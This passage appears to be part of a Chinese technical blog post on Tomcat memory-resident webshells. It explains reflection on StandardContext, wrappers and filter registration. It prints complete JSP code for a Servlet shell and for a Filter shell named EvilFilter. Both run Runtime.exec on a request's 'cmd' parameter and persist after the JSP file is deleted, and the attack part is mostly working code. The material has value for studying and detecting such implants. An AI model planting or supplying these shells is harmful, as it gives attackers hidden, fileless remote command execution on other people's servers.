class="line">%&gt;</span><br></pre></td></tr></table></figure>
+<p>然后编写一个获取context对象的代码段</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">request1</span> <span class="operator">=</span> (Request) field.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext) request1.getContext();</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+<p>然后拿上我们刚才从ContextConfig当中piao的创建wrapper和关联url与servlet的代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> context.createWrapper();</span><br><span class="line">wrapper.setName(servlet.getServletName());</span><br><span class="line">wrapper.setServletClass(servlet.getServletClass());</span><br><span class="line">context.addChild(wrapper);</span><br><span class="line">context.addServletMappingDecoded(entry.getKey(), entry.getValue());</span><br></pre></td></tr></table></figure>
+<p>但是光有这些还不行，因为在这段代码中并没有把真正的Servlet放在包装器里面，也就是说现在的wrapper是一个空壳，即便我们绑定了url和servletname也无法正常的进行解析。我们要把我们自己写的servlet放在里面才行。再合适位置上添加如下的代码段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wrapper.setServletCalss(new shell());</span><br></pre></td></tr></table></figure>
+<p>最终得到如下的jsp内存马</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.http.HttpServletRequest&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">shell</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse resp)</span></span><br><span class="line">                <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">            resp.getWriter().write(<span class="string">&quot;FanXing&quot;</span>);</span><br><span class="line">            <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">request1</span> <span class="operator">=</span> (Request) field.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext) request1.getContext();</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> context.createWrapper();</span><br><span class="line">    wrapper.setName(<span class="string">&quot;shell&quot;</span>);</span><br><span class="line">    wrapper.setServletClass(<span class="string">&quot;shell&quot;</span>);</span><br><span class="line">    wrapper.setServlet(<span class="keyword">new</span> <span class="title class_">shell</span>());</span><br><span class="line">    context.addChild(wrapper);</span><br><span class="line">    context.addServletMappingDecoded(<span class="string">&quot;/shell&quot;</span>, <span class="string">&quot;shell&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+<h5 id="测试内存马">5.1测试内存马</h5>
+<p>首先我们要访问shell.jsp，然后再访问预设的url接口</p>
+<img data-src="/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/%E5%8E%9F%E7%90%865.png" class>
+<p>然后我们把源文件删除</p>
+<img data-src="/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/%E5%8E%9F%E7%90%866.png" class>
+<img data-src="/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/%E5%8E%9F%E7%90%867.png" class>
+<p>发现还是能够触发内存马</p>
+<img data-src="/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/%E5%8E%9F%E7%90%868.png" class>
+<h5 id="关于loadonstartup">5.2关于LoadOnStartup</h5>
+<p>在文章https://zhuanlan.zhihu.com/p/546618658中有这样一段句话</p>
+<p>在servlet的配置当中即(web.xml)，
+<code>&lt;load-on-startup&gt;1&lt;/load-on-startup&gt;</code>
+的含义是：</p>
+<p>标记容器是否在启动的时候就加载这个servlet。当值为0或者大于0时，表示容器在应用启动时就加载这个servlet；当是一个负数时或者没有指定时，则指示容器在该servlet被选择时才加载。正数的值越小，启动该servlet的优先级越高。</p>
+<p>由于我们要注入内存马，且没有配置xml不会在应用启动时就加载这个servlet，因此需要通过反射将值修改为1，将其追加到list中</p>
+<p>之后通过load()进行加载，根据具体请求进行初始化、调用、销毁一系列操作，所以可以在代码中添加</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">newWrapper.setLoadOnStartup(1);</span><br></pre></td></tr></table></figure>
+<p>当时个人感觉没什么用，因为当我们重启的容器的时候整个servlet都会被销毁，再次启动时只能通过再访问一次jsp文件来进行servlet注册。</p>
+<h5 id="关于standardcontext获取">5.3关于StandardContext获取</h5>
+<h6 id="法一">法一</h6>
+<p>https://xz.aliyun.com/t/11003#toc-4</p>
+<p>对于内存马来讲我们最后要生成的是wrapper，但是wrapper的创建是交由Context对象来管理的，StandardContext又是实现了Context接口的实现类。所以是否能够获取StandardContext是能否注入内存马的关键。</p>
+<p>当有request对象的时候（jsp内置request对象）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tomcat中Web应用中获取的request.getServletContext是ApplicationContextFacade对象。该对象对ApplicationContext进行了封装，而ApplicationContext实例中又包含了StandardContext实例，所以当request存在的时候我们可以通过反射来获取StandardContext对象：</span><br></pre></td></tr></table></figure>
+<p>所以我们可以通过下面的方式得到一个StandardContext</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ServletContext servletContext = request.getServletContext();</span><br><span class="line">    Field fieldApplicationContext = servletContext.getClass().getDeclaredField(&quot;context&quot;);//获取ApplicationContext</span><br><span class="line">    fieldApplicationContext.setAccessible(true);</span><br><span class="line">    ApplicationContext applicationContext = (ApplicationContext) fieldApplicationContext.get(servletContext);</span><br><span class="line"></span><br><span class="line">    Field StandardContextField = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">    StandardContextField.setAccessible(true);</span><br><span class="line"></span><br><span class="line">    StandardContext context = (StandardContext) StandardContextField.get(applicationContext);</span><br></pre></td></tr></table></figure>
+<h6 id="法二">法二</h6>
+<p>当然还有我们这一次使用的网上流传最多的方法</p>
+<p>HttpServletRequest的request封装了org.apache.catalina.connector.Request的request，所以可以通过后者直接获取context。</p>
+<img data-src="/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/%E5%8E%9F%E7%90%869.png" class>
+<img data-src="/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/%E5%8E%9F%E7%90%8610.png" class>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Field field = request.getClass().getDeclaredField(&quot;request&quot;);</span><br><span class="line">field.setAccessible(true);</span><br><span class="line">Request request1 = (Request) field.get(request);</span><br><span class="line">StandardContext context = (StandardContext) request1.getContext();</span><br></pre></td></tr></table></figure>
+<h4 id="内存马实现filter">6.内存马实现——filter</h4>
+<h5 id="前置知识">6.1前置知识</h5>
+<h6 id="关于filter">关于filter</h6>
+<p>下面会通过一个例子来描述filter的工作流程即便这部分内容在前面的文字当中有所描述。</p>
+<p>编写一个servlet，由于filter说到底是在为servlet服务所以这一步是必不可少的。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.jws.WebService;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServletTest</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse res)</span> <span class="keyword">throws</span> ServletException, IOException&#123;</span><br><span class="line">        res.getWriter().write(<span class="string">&quot;hello servlet&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse res)</span> <span class="keyword">throws</span> ServletException, IOException&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后再写一个自定义的filter</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.Filter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">filtertest</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Filter init&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;doFilter&quot;</span>);</span><br><span class="line">        filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后在web.xml里面加入相应的配置信息</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>filterDemo<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>com.example.filtertest<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>filterDemo<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/demo<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>SerletTest<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.example.ServletTest<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>SerletTest<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/ServletTest<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>先来看一下filter运作的基本的一些流程。先通过ApplicationFilterFactory.createFilterChain创建一个filterchain</p>
+<img data-src="/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/filter3.png" class>
+<p>然后使用filterchain的dofilter触发自定义的dofilter方法。</p>
+<img data-src="/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/filter2.png" class>
+<p>从控制台的输出当中我们也能够知道，dofilter的执行情况</p>
+<img data-src="/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/filter1.png" class>
+<h6 id="关于context">关于context</h6>
+<p>Filter从属于Servlet规范的三大组件，其作用总在servlet之前，也在wrapper当中，从下面这个图可以更直观的看出filter的位置</p>
+<img data-src="/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/filter5.png" class>
+<p>所以要想对filter进行管理，注册，最终还是要转到context当中。而在之前的servlet内存马当中我们就已经使用过了StandardContext了，在这里就同理了。在StandardContext文件下有着如下的三个变量</p>
+<img data-src="/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/filter4.png" class>
+<p><strong>FilterDefs</strong>：存放FilterDef的数组
+，<strong>FilterDef</strong> 中存储着我们过滤器名，过滤器实例，作用 url
+等基本信息</p>
+<p><strong>FilterConfigs</strong>：存放filterConfig的数组，在
+<strong>FilterConfig</strong> 中主要存放 FilterDef 和
+Filter对象等信息</p>
+<p><strong>FilterMaps</strong>：存放FilterMap的数组，在
+<strong>FilterMap</strong> 中主要存放了 FilterName 和
+对应的URLPattern</p>
+<h5 id="内存马实现">6.2内存马实现</h5>
+<p>首先我们先要获取一个StandardContext对象</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">request1</span> <span class="operator">=</span> (Request) field.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext)request1.getContext();</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+<p>然后写一个恶意的Filter</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">filtertest</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Filter init&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        </span><br><span class="line">        filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>StandardContext对象提供两种方法用来用来操控Filter相关的属性</p>
+<img data-src="/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/filter6.png" class>
+<p>与此同时我们也可以使用FilterDef对象本身的方法对其进行操控。</p>
+<img data-src="/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/filter7.png" class>
+<p>由此我们可以创建一个FilterDef，然后使用Context的addFilterDef添加到Context当中。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EvilFilter</span>();</span><br><span class="line">  <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">  filterDef.setFilter(filter);</span><br><span class="line">  filterDef.setFilterName(<span class="string">&quot;EvilFilter&quot;</span>);</span><br><span class="line">  filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">  context.addFilterDef(filterDef);</span><br></pre></td></tr></table></figure>
+<p>下面需要使用FilterConfig对FilterDef进行封装，FilterConfig本身是一个接口，我们要去找一下它的实现类</p>
+<img data-src="/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/filter8.png" class>
+<p>我们最终找到了ApplicationFilterConfig类，不过该构造函数无修饰符，为default（表示本包内可以使用），可以使用反射的方式获取构造方法</p>
+<img data-src="/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/filter9.png" class>
+<p>由于StandardContext当中没有关于filterconfig的setter方法，所以只能使用反射的方式进行值的设定。我们可以简单的看一看StandardContext里面是怎么做的</p>
+<img data-src="/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/filter10.png" class>
+<p>最终写出代码如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(context, filterDef);</span><br><span class="line"><span class="type">Field</span> <span class="variable">field1</span> <span class="operator">=</span> StandardContext.class.getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">field1.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map)field1.get(context);</span><br><span class="line">filterConfigs.put(<span class="string">&quot;EvilFilter&quot;</span>, filterConfig);</span><br></pre></td></tr></table></figure>
+<p>剩下的就只有FilterMap了，我们直接来看它的源码，我们需要设置FilterMap里面的一些属性值。比如filtername，urlpattern以及dispatcher</p>
+<img data-src="/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/filter11.png" class>
+<p>这里的dispatcher需要设置为DispatcherType.REQUEST，该选项指定了filter过滤器根据DispatcherType的类型是否执行。</p>
+<p>最后我们可以使用standardcontext里面的函数addFilterMap把我们编写的filtermap加进context里面。</p>
+<img data-src="/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/filter12.png" class>
+<p>该部分代码如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//FilterMap</span></span><br><span class="line"><span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">filterMap.setFilterName(<span class="string">&quot;EvilFilter&quot;</span>);</span><br><span class="line">filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">context.addFilterMap(filterMap);</span><br></pre></td></tr></table></figure>
+<p>完整代码的如下</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span>&#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> servletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            Runtime.getRuntime().exec(cmd);</span><br><span class="line">            filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">//StandardContext</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">request1</span> <span class="operator">=</span> (Request) field.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext) request1.getContext();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//FilterDef</span></span><br><span class="line">    <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EvilFilter</span>();</span><br><span class="line">    <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">    filterDef.setFilter(filter);</span><br><span class="line">    filterDef.setFilterName(<span class="string">&quot;EvilFilter&quot;</span>);</span><br><span class="line">    filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">    